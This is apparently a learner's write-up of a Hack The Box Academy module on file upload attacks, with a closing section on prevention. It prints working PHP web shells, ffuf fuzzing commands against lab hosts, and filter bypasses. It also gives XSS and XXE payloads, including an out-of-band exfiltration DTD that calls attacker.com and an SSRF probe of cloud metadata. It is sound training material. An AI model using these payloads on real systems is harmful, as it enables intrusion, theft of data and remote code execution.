# HTB: File Upload Attacks

Module URL: https://academy.hackthebox.com/module/details/136

The `File Upload Attacks` module will teach you the following:

- What are file upload vulnerabilities?
- Examples of code vulnerable to file upload vulnerabilities
- Different types of file upload validations
- Detecting and exploiting basic file upload vulnerabilities
- Bypassing client-side file upload validation
- Bypassing blacklisted and whitelisted extension validation
- Bypassing type and content validation
- Bypassing other basic security restrictions
- Attacking upload forms with limited allowed file types
- Preventing file upload vulnerabilities through secure validation techniques

## Basic Exploitation

### **Absent Validation**

1. Understanding Absent Validation

Absent validation occurs when a web application lacks filters to check the type, name, or content of uploaded files. This allows an attacker to upload **arbitrary files**, such as malicious scripts, directly to the server.

---

2. Identifying the Web Framework

Before uploading a payload, you must determine the language the server executes (e.g., PHP, ASP.NET).

- **Manual Method:** Append extensions like `/index.php` or `/index.aspx` to the URL to see which one resolves.
- **Browser Extensions:** Use tools like **Wappalyzer** to automatically detect the backend language, web server version (e.g., Apache, Nginx), and Operating System.
    
    ![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/1.png)
    
- **Web Scanners:** Use Burp Suite or OWASP ZAP to fuzz extensions or scan for technologies.

---

3. Vulnerability Identification (Testing)

To confirm the vulnerability without immediately triggering alarms, use a "Proof of Concept" (PoC) rather than a full reverse shell:

1. **Create a simple script:** For PHP, use `<?php echo "Hello HTB";?>`.
2. **Upload the file:** If the server returns a "Success" message, it likely lacks backend validation.
3. **Execute the code:** Navigate to the uploaded file's location. If you see the output (e.g., "Hello HTB") instead of the raw source code, **Remote Code Execution (RCE)** is confirmed.

---

4. Exploitation Goal

Once the vulnerability is confirmed, attackers typically upload:

- **Web Shell:** A script that allows running system commands via the browser.
- **Reverse Shell:** A script that forces the server to initiate a connection back to the attacker’s machine, providing an interactive terminal session.

### Web Shell

A **Web Shell** is a script uploaded to the server that allows you to execute system commands directly through your browser.

- **Ready-made shells:** Tools like [`phpbash`](https://github.com/Arrexel/phpbash/tree/master) provide a terminal-like interface. Collections like **SecLists** contain pre-written shells for various languages (PHP, ASP, JSP).
- **Custom shells:** You can write a "one-liner" if you have no internet access. For PHP: `<?php system($_REQUEST['cmd']); ?>`. You then run commands via the URL: `?cmd=id`.

phpbash tool.Uploaded [phpbash.php](https://github.com/Arrexel/phpbash/tree/master) into the target: 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/2.png)

Costume web shell

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl "http://83.136.253.144:45852/uploads/web-shell.php?cmd=hostname"
ng-1742988-fileuploadsabsentverification-hnxnx-858b6f9c54-xcl25
```

### Reverse shell

A **Reverse Shell** is more powerful because it forces the target server to "call back" to your machine, giving you an interactive terminal in your own console (e.g., via Netcat).

- **Tools:** You can use scripts from **PentestMonkey** or generate custom payloads using **msfvenom**.
- **The Process:**
    1. Modify the script with your IP and Port.
    2. Start a listener on your machine: `nc -lvnp <PORT>`.
    3. Upload and visit the script on the web server to trigger the connection.

Since the target running on a public ip. Im going to set up a public ip to route the target traffic back to my machine 

## **Bypassing Filters**

### Client-side Validation:

**1. Understanding Client-Side Validation**

Web applications often use JavaScript to check a file's extension before it is even sent to the server.

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/3.png)

**Signs of Client-Side Validation:** The page displays an error (e.g., "Only images allowed!") instantly without refreshing or sending a network request.

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/4.png)

**The Flaw:** If the backend server (the "destination") doesn't double-check the file type, an attacker can bypass the "gatekeeper" (the browser).

---

**2. Bypass Method A: Intercepting the Request**

The most reliable method is to ignore the browser's UI and interact directly with the server using a proxy tool like **Burp Suite**.

1. **Capture a Valid Request:** Select a legitimate image (e.g., `test.png`) and click "Upload" while Burp Suite's Intercept is ON.
2. **Modify the Data:** In the captured HTTP request, change the metadata:
    - Change `filename="test.png"` to `filename="shell.php"`.
    - Replace the binary image data with your PHP code: `<?php system($_REQUEST['cmd']); ?>`.
        
        ![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/5.png)

        
    
3. **Forward:** Send the modified request to the server. If the backend lacks validation, it will save your PHP file.
    
    ![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/6.png)

    

---

**3. Bypass Method B: Manipulating Front-End Code**

Since JavaScript runs in your browser, you can use built-in **Developer Tools** (F12) to rewrite the application's rules.

Enable the response intercept from proxy settings. Upload the webshell.php and intercept the response, once intercepted, edit this line:

```bash
accept=".jpg,.jpeg,.png">
```

to accept `.php` extension as well, then forward the response.

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/7.png)

once accepted, we will see our .php file get uploaded

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/8.png)

visit the uploaded shell to confirm: 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/9.png)

### Blacklisted Filters:

This section covers bypassing **Blacklist Filters**, which is a server-side security measure that attempts to block specific "dangerous" file extensions. Unlike client-side validation, this happens on the server, but it is often prone to human error and oversight.

Testing client-side validation like we did before: 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/10.png)

---

**1. What is a Blacklist Filter?**

A blacklist is a list of forbidden extensions (e.g., `.php`, `.php7`, `.exe`). When you upload a file, the server checks the extension against this list. If it matches, the upload is rejected.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

**The Core Flaw:** Blacklists are rarely exhaustive. There are often dozens of alternative extensions that a web server might still treat as executable code but aren't included in the "forbidden" list.

---

**2. Bypassing the Blacklist**

**Method A: Case Sensitivity (Windows-based Servers)**

On some servers (especially Windows/IIS), file extensions are case-insensitive. If the blacklist only looks for `.php`, you might bypass it by using:

- `.pHp`, `.PhP`, or `.PHP`

**Method B: Fuzzing for Alternative Extensions**

Since manual guessing is slow, attackers use **Fuzzing** to test hundreds of extensions quickly using a proxy tool like **Burp Suite Intruder or ffuf**.I used ffuf tool with this wordlist **→**  [**PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst).** 

To test if the target executes PHP, you need to change the payload to a PHP command that get executes on the target. such as:

```bash
<?php echo "Fuzzed_" . (4*4); ?>
```

If the target executed this command, the response will be `Fuuzzed_16`

```bash
─$ ffuf -u "http://94.237.121.111:53514/upload.php" \
-X POST \
-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70eitp8Fr703FCBd" \
-d $'------WebKitFormBoundary70eitp8Fr703FCBd\r\nContent-Disposition: form-data; name="uploadFile"; filename="testFUZZ"\r\nContent-Type: image/jpeg\r\nContent-Type: image/jpeg\r\n\r\n<?php echo "Fuzzed_" . (4*4); ?>\r\n------WebKitFormBoundary70eitp8Fr703FCBd--' \
-fc 403,400 \
-w extensions.txt \
-x http://127.0.0.1:8080

```

I added the `x` switch to intercept the requests (on burp proxy settings is localhost:8080) to view the response body. 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/11.png)

In the request below, the target accepted `.phtm` extension but it didn't executed the php script

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/12.png)

on the other hand, this extension `phar` was accepted and executed by the target

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/13.png)

Which means, we can change the request of `<?php echo "Fuzzed_" . (4*4); ?>` to :

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/14.png)

verify: 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/15.png)

---

**3. Common PHP Alternatives**

If `.php` is blocked, modern web servers (like Apache or Nginx) are often configured to execute PHP code within these alternative extensions:

| Extension | Description |
| --- | --- |
| **.phtml** | Often used for PHP files that contain a lot of HTML. |
| **.php3 / .php4 / .php5** | Legacy versions that many servers still support for compatibility. |
| **.phar** | A PHP Archive file; many servers execute these as standard PHP. |
| **.inc** | Sometimes used for "include" files; can occasionally be executed. |

### Whitelisted Filters:

Somthing like this: 

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

---

**Method-1: Double Extensions**

If the application uses a weak Regular Expression that checks if a filename **contains** an allowed extension rather than **ending** with it, you can bypass the filter by including both.

- **Example:** `shell.jpg.php`
- **How it works:** The filter sees `.jpg` and allows the upload, but the server sees the final `.php` extension and executes the file as a script.

Example: using ffuf tool with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) and a php script to check which payload get executed by  the target.

```bash
ffuf -u "http://83.136.248.107:40588/upload.php" \
-X POST \
-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70eitp8Fr703FCBd" \
-d $'------WebKitFormBoundary70eitp8Fr703FCBd\r\nContent-Disposition: form-data; name="uploadFile"; filename="test.pngFUZZ"\r\nContent-Type: image/jpeg\r\nContent-Type: image/jpeg\r\n\r\n<?php echo "Fuzzed_" . (4*4); ?>\r\n------WebKitFormBoundary70eitp8Fr703FCBd--' \
-fc 403,400 \
-w whitelist.txt \
-x http://127.0.0.1:8080
```

The fuzz for `filename="test.pngFUZZ”`  didn't work 

```bash
filename="test.png.phtml"
```

**Method-2: Reverse Double Extensions (Server Misconfiguration)**

In this scenario, the application's filter might be strict, but the **Web Server (Apache)** is misconfigured.

- **Example:** `shell.php.jpg`
- **How it works:** The application allows the file because it ends in `.jpg`. However, if the Apache configuration (e.g., `php7.4.conf`) is written to execute any file *containing* `.php` (missing the `$` anchor in its regex), it will execute the file even if `.php` is not the final extension.

The previous fuzzing didn't work because of that. So I rerun the test and this time, the allowed extension is in the end of the file name.

```bash
filename="test.phtml.png"
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/16.png)

**Method-3: Character Injection**

Attackers can inject special characters to trick the web application or the underlying Operating System into misinterpreting the file extension.

- **Null Byte (`%00`):** In PHP versions 5.x and earlier, `shell.php%00.jpg` is seen by the validation logic as a `.jpg`, but the filesystem stops reading at the Null Byte, saving the file as `shell.php`.
- **Windows-Specific (`:`):** Using a colon (e.g., `shell.aspx:.jpg`) can trick Windows servers into ignoring the trailing extension.
- **Other Characters:** Newlines (`%0a`), spaces (`%20`), and slashes (`/`) can also cause discrepancies between how the application validates the name and how the server saves it.

We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

starting the test: 

```bash
 ffuf -u "http://94.237.120.119:57102/upload.php" -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70eitp8Fr703FCBd" -d $'------WebKitFormBoundary70eitp8Fr703FCBd\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\nContent-Type: image/jpeg\r\nContent-Type: image/jpeg\r\n\r\n<?php echo "Fuzzed_" . (4*4); ?>\r\n------WebKitFormBoundary70eitp8Fr703FCBd--' -fc 403,400 -w wordlist.txt -x http://127.0.0.1:8080
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/17.png)

files that uploaded successfully:

```bash
filename="shell.php/.jpg"
filename="shell.phps/.jpg"
filename="shell.php.\.jpg"
filename="shell.phps.\.jpg"
```

thought the was files uploaded, none of them was saved and only this file was saved `.jpg` because of `shell.phps.\.jpg`  

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/18.png)

### Type Filters:

This section focuses on **Type Filters**, which go beyond simple extension checking to validate the actual content of an uploaded file. Even if you use an allowed extension, the backend may reject the file if its internal structure doesn't match the expected type.

---

**1. Content-Type Header Validation**

The `Content-Type` header is sent by the browser to tell the server what kind of data is being uploaded (e.g., `image/jpeg`). Since this header is client-side, it is easily manipulated.

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

- **The Filter:** The server checks `$_FILES['uploadFile']['type']` against a whitelist of allowed MIME types.
- **The Bypass:** Intercept the request (using Burp Suite) and manually change the `Content-Type` header to an allowed image type (like `image/jpeg`), even if the file contains PHP code and has a `.php` extension.

---

**2. MIME-Type Validation (Magic Bytes)**

This is a more robust server-side check where the application inspects the **File Signature** or **Magic Bytes** (the first few bytes of the file).

- **The Filter:** Functions like PHP’s `mime_content_type()` read the actual bytes of the file to determine its type, regardless of the extension or the header.
- **The Bypass:** Prepend the file content with the "Magic Bytes" of an allowed format.
    - **GIF Example:** The string `GIF8` or `GIF89a` is the magic byte signature for GIF images.
    - **Execution:** By adding `GIF8` to the very top of a `.php` file, the server's MIME check identifies it as an image, but the PHP engine will still execute the code following the `GIF8` string.
    - Example: The `file` command on Unix systems finds the file type through the MIME type
        
        ```bash
        $ echo "this is a text file" > test.jpg                      
        $ file test.jpg              
        test.jpg: ASCII text
        ```
        
        As we see, the file's MIME type is `ASCII text`, even though its extension is `.jpg`. However, if we write `GIF8` to the beginning of the file, it will be considered as a `GIF` image instead, even though its extension is still `.jpg`:
        
        ```bash
        $ echo "GIF89a" > test.jpg             
        $ file test.jpg           
        test.jpg: GIF image data, version 89a,
        ```
        

Wordlist used → https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

### Challenge:

The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt" 

**First**: Since the target validate the Content-Type and MIME-Type, make sure all of the request contains 

```bash
 Content-Type: image/jpeg 

```

and the beginning of the body should contains valid image signature, like this

```bash
GIF8
```

**Second**: We can simply bypassing the client-side validation by sending the request from burp suite

**Third**: Testing blacklist bypass:  (wordlist **→**  [**PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst).** )

```bash
ffuf -u "http://83.136.253.144:56017/upload.php" \
     -X POST \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB7zDrhowDEtrLGed" \
     -d $'------WebKitFormBoundaryB7zDrhowDEtrLGed\r\nContent-Disposition: form-data; name="uploadFile"; filename="shellFUZZ"\r\nContent-Type: image/jpeg\r\n\r\nGIF8<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryB7zDrhowDEtrLGed--' \
     -w blacklist.txt \
     -fc 403,400 \
     -x http://127.0.0.1:8080
```

Some got bypassed: 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/19.png)

```bash
filename="shell.php\x00.jpg"
filename="shell.php\x00.png"
filename="shell.php\x00.gif"
```

Error: **Only images are allowed**

```bash
filename="shell.phtm"
filename="shell.pgif"
filename="shell.phtml"
 filename="shell.pht"
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/20.png)

Error: **Extension not allowed:** This for all phpx extensions

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/21.png)

For the requests that successfully uploaded, it wont execute because the server saved them as `.jpg`

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/22.png)

**Fourth**: Testing bypassing whiltelist ( used [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt))

Using Double extension method: `filename="shell.pngFUZZ`

```bash
ffuf -u "http://83.136.253.144:56017/upload.php" \
     -X POST \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB7zDrhowDEtrLGed" \
     -d $'------WebKitFormBoundaryB7zDrhowDEtrLGed\r\nContent-Disposition: form-data; name="uploadFile"; filename="shell.pngFUZZ"\r\nContent-Type: image/jpeg\r\n\r\nGIF8<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryB7zDrhowDEtrLGed--' \
     -w whitelist.txt \
     -fc 403,400 \
     -x http://127.0.0.1:8080
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/23.png)

That finally worked for the file name

```bash
filename="shell.png.phtml"
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/24.png)

If the double extension didnt work, try reversing them, like: 

```bash
filename="shellFUZZ.png"
```

At the end we have successfully bypassed: 

- Client-validation
- Server-validation
    - Content-Type check
    - MIME type check
    - Whitelist validation

## Other Upload Attacks

### Limited File Uplaod

**1. Cross-Site Scripting (XSS)**

Even if server-side code execution (e.g., PHP) is blocked, JavaScript can be delivered to other users via:

- **HTML Uploads:** Directly uploading `.html` files containing malicious scripts.
- **Metadata Injection:** Using tools like `exiftool` to insert payloads into image metadata fields (e.g., Comment, Artist). The script triggers if the application displays this metadata.
    
    ```xml
    $ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
     
    $ exiftool HTB.jpg
    ...SNIP...
    Comment                         :  "><img src=1 onerror=alert(window.origin)>
    ```
    
- **SVG Files:** Since SVGs are XML-based, `<script>` tags can be embedded directly into the image structure.
- **MIME-Type Spoofing:** Forcing an image to be treated as `text/html` to execute embedded scripts.

**Example:  XSS Exploitation:**

Upload this svg file into the upload.php page which will trigger an alert that displays the hostname  and port of the current url 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/25.png)

Then refresh the main page to trigger the xss payload

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/26.png)

---

**2. XML External Entity (XXE)**

Web applications that process XML-based files (SVG, PDF, Word, etc.) may be vulnerable to XXE:

- **Information Disclosure:** Using malicious XML entities to read local system files (e.g., `/etc/passwd`).
- **Source Code Exfiltration:** Using PHP filters (e.g., `php://filter`) to encode source files like `index.php` into Base64 for extraction.
- **SSRF:** Leveraging XXE to probe internal services or interact with private APIs.

**Example: xxe Exploitation:** Upload an svg file into the upload.php file then refresh the main page

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/27.png)

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/28.png)

reading source code 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```html
<?php
libxml_disable_entity_loader(false);

$svg_file = file_get_contents('./images/' . file_get_contents('./images/latest.xml'));
$doc = new DOMDocument();
$doc->loadXML($svg_file, LIBXML_NOENT | LIBXML_DTDLOAD);
$svg = $doc->getElementsByTagName('svg');
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Employee File Manager</title>
  <link rel="stylesheet" href="./style.css">
</head>

<body>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
  <script src="./script.js"></script>
  <div>
    <h1>Update your logo</h1>
    <center>
      <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
        <input type="file" name="uploadFile" id="uploadFile" accept=".svg">
        <?php echo $svg->item(0)->C14N(); ?>
        <input type="submit" value="Upload" id="submit">
      </form>
    </center>
  </div>
</body>

</html>
```

reading upload.php

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

```php
<?php
$target_dir = "./images/";
$fileName = basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!preg_match('/^.*\.svg$/', $fileName)) {
    echo "Only SVG images are allowed";
    die();
}

foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/svg+xml'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    $latest = fopen($target_dir . "latest.xml", "w");
    fwrite($latest, basename($_FILES["uploadFile"]["name"]));
    fclose($latest);
    echo "File successfully uploaded";
} else {
    echo "File failed to upload";
}
```

so the uploaded imeges is in this directory

```xml
./images
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/29.png)

also note:  The script uses `$fileName = basename(...)`, which effectively strips all `../` characters, forcing your file to stay in the `./images/` directory where it cannot overwrite system-wide configurations.

**Advanced XXE Payloads**

While `file:///etc/passwd` is the standard "proof of concept," these variations are used for different environments and constraints:

**1. Blind XXE via Out-of-Band (OOB) Exfiltration**

If the application doesn't display the output of the XML, you can force the server to send the data to your own machine.

- **Payload (External DTD):**XML
    
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
    %eval;
    %exfil;
    ```
    
    *This requires hosting a `.dtd` file on your server that the target fetches.*
    

**2. XXE to SSRF (Port Scanning)**

You can use the XML parser to probe internal network services that aren't accessible from the internet.

- **Payload:**XML
    
    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
    ```
    
    *Useful for stealing AWS/Cloud metadata or finding internal web panels on `localhost:8080`.*
    

**3. XML Parameter Entities (Bypassing WAFs)**

Sometimes regular entities are blocked, but **parameter entities** (starting with `%`) are overlooked.

- **Payload:**XML
    
    ```xml
    <!DOCTYPE data [
      <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
      %remote;
    ]>
    ```
    

---

**3. Denial of Service (DoS)**

Attackers can exhaust server resources to take the application offline:

- **Decompression Bombs:** Uploading ZIP archives with highly nested data that expands to petabytes when unzipped.
- **Pixel Floods:** Manipulating image headers (JPG/PNG) to claim massive dimensions (e.g., 4 Gigapixels), forcing the server to crash during memory allocation.
- **Storage Exhaustion:** Uploading massive files to fill the server’s hard drive.
- **Directory Traversal:** Using `../` in filenames to overwrite critical system files or configurations.

### Other upload Attacks

This text outlines several advanced techniques used to exploit file upload features on websites beyond just uploading a "shell." :

**1. Injections in the File Name**

Hackers don't just care about what is *inside* a file; they use the **name of the file** as a weapon.

- **Command Injection:** Naming a file something like `file$(whoami).jpg`. If the server uses that name in a system command (like moving the file), it accidentally executes the hacker's code.
- **XSS & SQLi:** Using script tags (`<script>`) or SQL queries in the filename to attack the database or other users who view the filename on the site.
    
    ```bash
    # e.g adding xss in the file name
    <script>alert(window.origin);</script>
    
    # or sqli
    file';select+sleep(5);--.jpg)
    ```
    

**2. Finding the "Uploads" Folder**

If a hacker doesn't know where their file was saved, they use "Upload Directory Disclosure" techniques:

- **Fuzzing:** Using automated tools to guess folder names.
- **Forcing Errors:** Intentionally causing the server to crash or error out (by uploading a file that is too long or already exists). Often, the error message itself reveals the full folder path (e.g., `C:\var\www\uploads\`).

**3. Windows-Specific Attacks**

Windows handles files differently than Linux, creating unique holes:

- **Reserved Characters:** Using characters like  or `?` to confuse the system.
- **Reserved Names:** Naming files `CON` or `NUL` (names Windows uses for internal tasks), which can cause the server to freeze or error.
- [**8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename):** Using the "tilde" shortcut (like `HAC~1.TXT`) to guess existing filenames or even overwrite important configuration files like `web.conf`.

**4. Attacking the "Processors" (Advanced Attacks)**

Many websites use "libraries" (pre-made tools) to process files after they are uploaded (e.g., resizing an image or converting a video).

- **Exploiting the Tool:** If the tool (like **ffmpeg** for video) has a known flaw, a hacker can upload a specially crafted file (like an **AVI**) that triggers a vulnerability (like **XXE**) to steal secret data from the server.
- **Custom Code:** If a company writes its own processing code, it may contain unique, advanced bugs that require deep analysis to find.

## Preventing File Upload Vulnerabilities

To prevent file upload vulnerabilities, developers should implement a multi-layered defense strategy focusing on validation, access control, and server hardening.

### **1. File Validation**

- **Extension Validation:** * Use **whitelisting** (allowed extensions) and **blacklisting** (dangerous extensions) simultaneously.
    - Apply validation on both the **front-end** (user experience) and **back-end** (security).
    
    ```php
    $fileName = basename($_FILES["uploadFile"]["name"]);
    
    // blacklist test
    if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
        echo "Only images are allowed";
        die();
    }
    
    // whitelist test
    if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
        echo "Only images are allowed";
        die();
    }
    ```
    
- **Content Validation:** * Never rely on extensions alone; verify the file's **MIME type** and **File Signature** (magic bytes).
    - Ensure the extension matches the identified content type.
    
    ```php
    $fileName = basename($_FILES["uploadFile"]["name"]);
    $contentType = $_FILES['uploadFile']['type'];
    $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
    
    // whitelist test
    if (!preg_match('/^.*\.png$/', $fileName)) {
        echo "Only PNG images are allowed";
        die();
    }
    
    // content test
    foreach (array($contentType, $MIMEtype) as $type) {
        if (!in_array($type, array('image/png'))) {
            echo "Only PNG images are allowed";
            die();
        }
    }
    ```
    

### **2. Secure Storage and Access**

- **Prevent Direct Access:** * Store files in a non-web-accessible directory.
    - Use a script (e.g., `download.php`) to serve files rather than providing direct URLs.
    - Implement strict authorization and path sanitization to prevent **IDOR** and **LFI** vulnerabilities.
- **Filename Randomization:** * Rename files to random strings upon storage to prevent execution and injection attacks.
    - Store original, sanitized names in a database for retrieval.
- **Server Headers:** Use `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` to prevent browsers from executing or sniffing malicious content.

### **3. Server Environment Hardening**

- **Isolation:** Store uploads on a separate server or container to limit the blast radius of a potential compromise.
- **Function Disabling:** Use configurations like PHP’s `disable_functions` to block dangerous system commands (e.g., `exec`, `system`).
- **Directory Restrictions:** Use tools like `open_basedir` to confine web applications to specific directories.
- **Error Handling:** Disable system-level error reporting to prevent sensitive information disclosure.

### **4. Additional Defensive Measures**

- **Size Limits:** Restrict the maximum file size to prevent Denial of Service (DoS).
- **Malware Scanning:** Scan all uploads for viruses or malicious strings.
- **WAF:** Deploy a Web Application Firewall as a secondary layer of protection.
- **Updates:** Keep all libraries and frameworks updated to the latest secure versions.

## **Skills Assessment - File Upload Attacks**

In the contact page, when you fill the fields and click on submit

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s1.png)

it will return a GET request to this page 

```bash
GET /contact/submit.php?Name=test&Email=test%40gmail.com&Message=teest&uploadFile=image.png
```

But when you select an image and click on the green button, it will send a POST request to:

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s2.png)

which will render the image. and if we try to rename the image extension to .php, it will return this error:

```bash
Extension not allowed
```

### Content-Type Fuzzing

I first started with content-type fuzzing and look what I found !

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s3.png)

We can upload an image with `.svg` extension

```bash
Content-Type: image/svg+xml
```

thats mean we will try for XXE exploitation!. 

### XXE Exploitation

changing the filename to `test.svg` and the content-type to `image/svg+xml` and finally injecting this payload to read passwd file

```bash
<?xxe version="1.0" encoding="UTF-8" ?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s4.png)

reading the source code: 

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

file `common-functions.php`

```php
<?php

function displayHTMLImage($imageFile)
{
    $type = mime_content_type($imageFile);

    switch ($type) {
        case 'image/jpg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/jpeg':
